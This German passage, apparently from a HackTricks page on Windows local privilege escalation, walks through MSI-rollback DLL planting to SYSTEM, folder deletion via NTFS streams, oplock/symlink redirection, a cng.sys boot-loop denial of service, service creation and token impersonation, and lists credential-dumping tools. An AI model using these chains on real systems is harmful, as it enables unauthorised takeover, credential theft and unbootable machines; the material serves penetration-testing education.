        - anschließend auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Öffne nach dem Signal die `.rbf`-Datei **ohne `FILE_SHARE_DELETE`** – dadurch **wird verhindert, dass sie gelöscht wird**.
    - Signalisiere anschließend zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche (als Angreifer) die `.rbf`-Datei manuell.
    - Nun ist **`C:\Config.Msi` leer** und kann gehijackt werden.

> An diesem Punkt **löst du die SYSTEM-level-Schwachstelle zum beliebigen Löschen von Ordnern aus**, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte einen Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation dient dazu, erneut ein **Rollback** auszulösen, bei dem `.rbs` und `.rbf` gelesen werden.

- Schritt 8: Auf `.rbs` überwachen
    - Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, sobald die `.rbs` erstellt wurde.
        - anschließend wartet, bevor der Vorgang fortgesetzt wird.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach Empfang des Ereignisses `.rbs created`:
        - wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du jedoch weiterhin einen Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, sodass du weiterhin in den Ordner schreiben kannst.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (eine bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen DLL-Payload auf SYSTEM-Ebene** ab.

- Schritt 12: Rollback auslösen
    - Signalisiere das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **Custom Action vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielpfad.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Abschließender Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir gehijackte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die Haupttechnik mit MSI-Rollback (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Schwachstelle nur das **beliebige Löschen von Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen Alternate Data Stream namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Indexmetadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Du kannst dafür standardmäßige APIs zum Löschen von Dateien verwenden, z. B.:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine *Datei*-Lösch-API aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen des Ordnerinhalts zur SYSTEM-EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – die Löschung umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **Junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstellen Sie einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream, in dem Ordner-Metadaten gespeichert sind — ihn zu löschen, löscht den Ordner.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch jetzt wird aufgrund der Junction + des Symlinks tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von „beliebigen Ordner erstellen“ zu dauerhaftem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/Admin einen beliebigen Ordner erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, zum Beispiel:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodustreiber `cng.sys`.
- Wenn Sie **ihn vorab als Ordner erstellen**, kann Windows beim Booten den eigentlichen Treiber nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. eine Bootreparatur oder Datenträgerzugriff).

### Von privilegierten Protokoll-/Sicherungspfaden und OM-Symlinks zum Überschreiben beliebiger Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Protokolle/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** ausgelesen wird, können Sie diesen Pfad mit **Object Manager-Symlinks + NTFS-Mountpoints** umleiten, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben umzuwandeln (sogar **ohne SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration mit dem Zielpfad ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mountpoint zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Protokoll, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration aus, um das Ziel des privilegierten Protokolls zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Administrator „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann diese zuerst geladen werden, wodurch sie sich zuverlässig als DoS-Ziel für beschädigte Daten eignet.



## **Von High Integrity zu SYSTEM**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Weg zu SYSTEM** ganz einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Service-Binärdatei darauf, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Von einem High Integrity-Prozess aus kannst du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem bereits vorhandenen High Integrity-Prozess), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (ausgenommen geschützte Prozesse), das **Token des Prozesses kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Berechtigungen_).\
**Ein** [**Codebeispiel, das die vorgeschlagene Technik ausführt, findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter zur Privilegienerweiterung in `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Der **Server**, der die Pipe mithilfe der **`SeImpersonate`**-Berechtigung erstellt hat, kann dann **das Token des Pipe-Clients** (des Service) imitieren und dadurch SYSTEM-Berechtigungen erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von High Integrity zu System gelangst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, **eine DLL zu hijacken**, die von einem **Prozess** mit **SYSTEM**-Berechtigungen **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking eignet sich daher ebenfalls für diese Art der Privilegienerweiterung. Außerdem ist es **von einem High Integrity-Prozess aus wesentlich einfacher**, da dieser **Schreibberechtigungen** für die Ordner hat, aus denen DLLs geladen werden.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statische impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool zum Suchen nach lokalen Windows-Privilegienerweiterungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier nachsehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier nachsehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter über die Domäne**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung für privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten privesc-Schwachstellen (VERALTET, stattdessen Watson verwenden)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Adminrechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für privesc) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus zahlreichen Programmen (vorkompilierte exe auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt accesschk nicht, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der richtigen .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilegien erhöhen durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – OSCP-Komplettanleitung](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Anleitung zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Windows Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → hMailServer-Anmeldedaten entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-leak + Stack-BOF → VirtualAlloc-ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel im Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Zurück in die Vergangenheit: Symbolische Links unter Windows missbrauchen](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklistenaufgaben, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – Funktion RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Dienst-Binärdateien kapern](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: CLDFLT- und DirectX-Kernel-Race-Conditions für Windows-LPE verketten](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitiv unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Privilegien zu erhöhen – und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388-PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Image-Änderung zur Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH-Private-Keys aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM verfolgen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Sicherheitshinweis zur Privilege Escalation durch Offsets im gemeinsamen Speicher von Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
